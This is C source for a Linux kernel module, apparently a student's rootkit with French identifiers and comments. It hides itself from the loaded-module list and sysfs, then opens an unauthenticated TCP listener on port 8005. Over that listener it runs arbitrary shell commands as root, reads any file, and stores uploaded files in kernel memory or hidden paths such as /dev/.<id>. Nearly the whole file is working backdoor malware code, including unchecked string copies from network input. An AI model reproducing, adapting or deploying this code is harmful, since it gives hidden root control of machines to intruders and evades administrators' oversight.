#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/kthread.h>
#include <net/sock.h>
#include <linux/syscalls.h>
#include <linux/crc32.h>
#include <linux/list.h>
#include <linux/delay.h>
#include <linux/namei.h>
#include <linux/dcache.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Etudiant");
MODULE_DESCRIPTION("Module Noyau Caché");
MODULE_VERSION("0.1");

struct linux_dirent64_local {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

static struct socket *sockfd;
static struct task_struct *tache_serveur;

#define PORT_CONTROLE 8005
#define TAILLE_BUFFER 4096
#define CACHER_PREFIX "k_cache_"
#define MAX_FICHIERS 20
#define MAX_TAILLE_FICHIER (5 * 1024 * 1024)

struct fichier_cache {
    char nom[256];
    unsigned char *donnees;
    size_t taille;
    struct list_head liste;
    unsigned long crc;
};

static LIST_HEAD(fichiers_caches);
static DEFINE_SPINLOCK(fichiers_lock);

static int ajouter_fichier_cache(const char *nom, const unsigned char *donnees, size_t taille) {
    struct fichier_cache *nouveau;
    
    nouveau = kmalloc(sizeof(struct fichier_cache), GFP_KERNEL);
    if (!nouveau)
        return -ENOMEM;
    
    strncpy(nouveau->nom, nom, 255);
    nouveau->nom[255] = 0;
    
    nouveau->donnees = kmalloc(taille, GFP_KERNEL);
    if (!nouveau->donnees) {
        kfree(nouveau);
        return -ENOMEM;
    }
    
    memcpy(nouveau->donnees, donnees, taille);
    nouveau->taille = taille;
    nouveau->crc = crc32(0, donnees, taille);
    
    spin_lock(&fichiers_lock);
    list_add(&nouveau->liste, &fichiers_caches);
    spin_unlock(&fichiers_lock);
    
    return 0;
}

static struct fichier_cache *trouver_fichier_cache(const char *nom) {
    struct fichier_cache *f;
    
    spin_lock(&fichiers_lock);
    list_for_each_entry(f, &fichiers_caches, liste) {
        if (strcmp(f->nom, nom) == 0) {
            spin_unlock(&fichiers_lock);
            return f;
        }
    }
    spin_unlock(&fichiers_lock);
    
    return NULL;
}

static void liberer_fichiers_caches(void) {
    struct fichier_cache *f, *temp;
    
    spin_lock(&fichiers_lock);
    list_for_each_entry_safe(f, temp, &fichiers_caches, liste) {
        list_del(&f->liste);
        kfree(f->donnees);
        kfree(f);
    }
    spin_unlock(&fichiers_lock);
}

static char *lister_fichiers_caches(void) {
    struct fichier_cache *f;
    char *liste;
    int pos = 0;
    
    liste = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
    if (!liste)
        return NULL;
    
    memset(liste, 0, TAILLE_BUFFER);
    strncpy(liste, "Fichiers stockés en mémoire:\n", TAILLE_BUFFER - 1);
    pos = strlen(liste);
    
    spin_lock(&fichiers_lock);
    list_for_each_entry(f, &fichiers_caches, liste) {
        int written = snprintf(liste + pos, TAILLE_BUFFER - pos, 
                              "- %s (%zu octets)\n", 
                              f->nom, f->taille);
        if (written > 0)
            pos += written;
    }
    spin_unlock(&fichiers_lock);
    
    return liste;
}

static char *extraire_fichier_cache(const char *nom) {
    struct fichier_cache *f;
    char *message;
    
    f = trouver_fichier_cache(nom);
    if (!f) {
        message = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
        if (message)
            sprintf(message, "Erreur: fichier '%s' non trouvé", nom);
        return message;
    }
    
    message = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
    if (!message)
        return NULL;
    
    sprintf(message, "Contenu binaire de %s (%zu octets)", f->nom, f->taille);
    return message;
}

static int cacher_fichier_fs(const char *nom, const unsigned char *donnees, size_t taille, const char *chemin) {
    struct file *f;
    int ret = 0;
    loff_t pos = 0;
    
    printk(KERN_INFO "Écriture du fichier %s à %s (%zu octets)\n", nom, chemin, taille);
    
    f = filp_open(chemin, O_WRONLY | O_CREAT, 0644); // Changer les permissions
    if (IS_ERR(f)) {
        printk(KERN_ERR "Erreur ouverture fichier: %ld\n", PTR_ERR(f));
        return PTR_ERR(f);
    }
    
    ret = kernel_write(f, donnees, taille, &pos);
    printk(KERN_INFO "Octets écrits: %d\n", ret);
    
    filp_close(f, NULL);
    
    return ret;
}
char *executer_commande(char *cmd) {
    char *resultat;
    char *temp_file = "/tmp/.cmd_output";
    char *cmd_with_bash = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
    struct file *f;
    loff_t pos = 0;
    char *argv[] = {"/bin/bash", "-c", cmd_with_bash, NULL};
    char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};

    int ret;
    int len;


    resultat = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
    if (!resultat)
        return NULL;
    
    snprintf(cmd_with_bash, TAILLE_BUFFER, "bash -c \"%s > /tmp/.cmd_output 2>&1\"", cmd);
    
    
    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    
    f = filp_open(temp_file, O_RDONLY, 0);
    if (IS_ERR(f)) {
        sprintf(resultat, "Exécution terminée avec code: %d (sortie non capturée)", ret);
        return resultat;
    }
    
    memset(resultat, 0, TAILLE_BUFFER);
    kernel_read(f, resultat, TAILLE_BUFFER - 1, &pos);
    filp_close(f, NULL);
    
    f = filp_open(temp_file, O_WRONLY | O_TRUNC | O_CREAT, 0644);
    if (!IS_ERR(f))
        filp_close(f, NULL);
    
    len = strlen(resultat);
    if (len < TAILLE_BUFFER - 40)
        sprintf(resultat + len, "\n\nCode de retour: %d", ret / 256);
    
    return resultat;
}
char *lire_fichier(char *chemin) {
    struct file *f;
    loff_t pos = 0;
    char *contenu;
    int err;
    
    contenu = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
    if (!contenu)
        return NULL;
    memset(contenu, 0, TAILLE_BUFFER);
    f = filp_open(chemin, O_RDONLY, 0);
    if (IS_ERR(f)) {
        sprintf(contenu, "Erreur ouverture fichier: %ld", PTR_ERR(f));
        return contenu;
    }
    
    err = kernel_read(f, contenu, TAILLE_BUFFER - 1, &pos);
    if (err < 0)
        sprintf(contenu, "Erreur lecture fichier: %d", err);
    
    filp_close(f, NULL);
    return contenu;
}

static void cacher_module(void) {
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

static int recevoir_fichier(struct socket *sock_client, const char *nom, const char *methode, const char *chemin) {
    unsigned char *buffer;
    int recu = 0;
    int ret = 0;
    struct msghdr msg;
    struct kvec iov;
    printk(KERN_INFO "Début réception fichier: %s, méthode: %s\n", nom, methode);
    
    buffer = kmalloc(MAX_TAILLE_FICHIER, GFP_KERNEL);
    if (!buffer)
        return -ENOMEM;
    
    memset(&msg, 0, sizeof(msg));
    
    iov.iov_base = buffer;
    iov.iov_len = MAX_TAILLE_FICHIER;
    
    ret = kernel_recvmsg(sock_client, &msg, &iov, 1, MAX_TAILLE_FICHIER, 0);
    
    if (ret > 0) {
        recu = ret;
        printk(KERN_INFO "Données reçues: %d octets\n", recu);
        
        if (strcmp(methode, "kernel") == 0) {
            printk(KERN_INFO "Stockage en mémoire kernel\n");
            ajouter_fichier_cache(nom, buffer, recu);
        } else if (strcmp(methode, "fs") == 0) {
            char chemin_final[256];
            if (chemin && strlen(chemin) > 0) {
                strcpy(chemin_final, chemin);
            } else {
                sprintf(chemin_final, "/dev/.%lx", (unsigned long)jiffies);
            }
            printk(KERN_INFO "Stockage dans le fichier: %s\n", chemin_final);
            cacher_fichier_fs(nom, buffer, recu, chemin_final);
        }
        iov.iov_base = "Fichier reçu et stocké avec succès";
        iov.iov_len = strlen("Fichier reçu et stocké avec succès");
        kernel_sendmsg(sock_client, &msg, &iov, 1, strlen("Fichier reçu et stocké avec succès"));
    } else {
        printk(KERN_ERR "Erreur réception fichier: %d\n", ret);
    }
    kfree(buffer);
    return recu;
}



int traiter_connexion(struct socket *sock_client) {
    char *buffer_reception;
    char *buffer_reponse;
    int taille_recue;
    struct msghdr msg;
    struct kvec iov;
    int err;
    
    buffer_reception = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
    if (!buffer_reception)
        return -ENOMEM;
    
    memset(&msg, 0, sizeof(msg));
    memset(buffer_reception, 0, TAILLE_BUFFER);
    
    iov.iov_base = buffer_reception;
    iov.iov_len = TAILLE_BUFFER - 1;
    taille_recue = kernel_recvmsg(sock_client, &msg, &iov, 1, TAILLE_BUFFER - 1, 0);
    
    if (taille_recue <= 0) {
        kfree(buffer_reception);
        return taille_recue;
    }
    
    buffer_reception[taille_recue] = '\0';
    
    if (strncmp(buffer_reception, "EXEC ", 5) == 0) {
        buffer_reponse = executer_commande(buffer_reception + 5);
    } else if (strncmp(buffer_reception, "LIRE ", 5) == 0) {
        buffer_reponse = lire_fichier(buffer_reception + 5);
    } else if (strncmp(buffer_reception, "UPLOAD ", 7) == 0) {
        char *nom_fichier = kmalloc(256, GFP_KERNEL);
        char *methode = kmalloc(32, GFP_KERNEL);
        char *chemin = kmalloc(256, GFP_KERNEL);
        
        if (!nom_fichier || !methode || !chemin) {
            if (nom_fichier) kfree(nom_fichier);
            if (methode) kfree(methode);
            if (chemin) kfree(chemin);
            buffer_reponse = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
            if (buffer_reponse)
                strcpy(buffer_reponse, "Erreur: allocation mémoire");
        } else {
            memset(chemin, 0, 256);
            if (sscanf(buffer_reception + 7, "%255s %31s %255s", nom_fichier, methode, chemin) < 2) {
                buffer_reponse = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
                if (buffer_reponse)
                    strcpy(buffer_reponse, "Erreur: format invalide. Utilisez: UPLOAD nom_fichier methode [chemin]");
            } else {
                iov.iov_base = "PRET";
                iov.iov_len = 4;
                kernel_sendmsg(sock_client, &msg, &iov, 1, 4);
                
                recevoir_fichier(sock_client, nom_fichier, methode, chemin);
                kfree(nom_fichier);
                kfree(methode);
                kfree(chemin);
                kfree(buffer_reception);
                return 0;
            }
        }
        if (nom_fichier) kfree(nom_fichier);
        if (methode) kfree(methode);
        if (chemin) kfree(chemin);
    } else if (strncmp(buffer_reception, "FICHIERS", 8) == 0) {
        buffer_reponse = lister_fichiers_caches();
    } else if (strncmp(buffer_reception, "EXTRAIT ", 8) == 0) {
        buffer_reponse = extraire_fichier_cache(buffer_reception + 8);
    } else {
        buffer_reponse = kmalloc(TAILLE_BUFFER, GFP_KERNEL);
        if (buffer_reponse)
            strcpy(buffer_reponse, "Commande non reconnue");
    }
    
    if (buffer_reponse) {
        iov.iov_base = buffer_reponse;
        iov.iov_len = strlen(buffer_reponse);
        err = kernel_sendmsg(sock_client, &msg, &iov, 1, strlen(buffer_reponse));
        kfree(buffer_reponse);
    }
    
    kfree(buffer_reception);
    return 0;
}






















int creer_serveur(void *arg) {
    struct socket *sock_client;
    int err;
    allow_signal(SIGKILL);
    while (!kthread_should_stop()) {
        err = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock_client);
        if (err < 0)
            continue;
        err = kernel_accept(sockfd, &sock_client, 0);
        if (err < 0) {
            sock_release(sock_client);
            continue;
        }
        
        traiter_connexion(sock_client);
        sock_release(sock_client);
        if (signal_pending(current))
            break;
            
        schedule();
    }
    
    return 0;
}

static int __init rootkit_init(void) {
    int err;
    struct sockaddr_in serveur_adresse;
    
    printk(KERN_INFO "Initialisation du module...\n");
    err = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sockfd);
    if (err < 0) {
        printk(KERN_ERR "Impossible de créer le socket: %d\n", err);
        return err;
    }
    memset(&serveur_adresse, 0, sizeof(serveur_adresse));
    serveur_adresse.sin_family = AF_INET;
    serveur_adresse.sin_port = htons(PORT_CONTROLE);
    serveur_adresse.sin_addr.s_addr = INADDR_ANY;
    err = kernel_bind(sockfd, (struct sockaddr *)&serveur_adresse, sizeof(serveur_adresse));
    if (err < 0) {
        printk(KERN_ERR "Impossible de lier le socket: %d\n", err);
        sock_release(sockfd);
        return err;
    }
    err = kernel_listen(sockfd, 5);
    if (err < 0) {
        printk(KERN_ERR "Impossible de mettre le socket en écoute: %d\n", err);
        sock_release(sockfd);
        return err;
    }
    tache_serveur = kthread_run(creer_serveur, NULL, "kserveur");
    if (IS_ERR(tache_serveur)) {
        err = PTR_ERR(tache_serveur);
        printk(KERN_ERR "Impossible de créer le thread serveur: %d\n", err);
        sock_release(sockfd);
        return err;
    }
    cacher_module();
    printk(KERN_INFO "Module initialisé avec succès\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    if (tache_serveur && !IS_ERR(tache_serveur)) {
        kthread_stop(tache_serveur);
    }
    
    if (sockfd)
        sock_release(sockfd);
    
    liberer_fichiers_caches();
    
    printk(KERN_INFO "Module supprimé\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

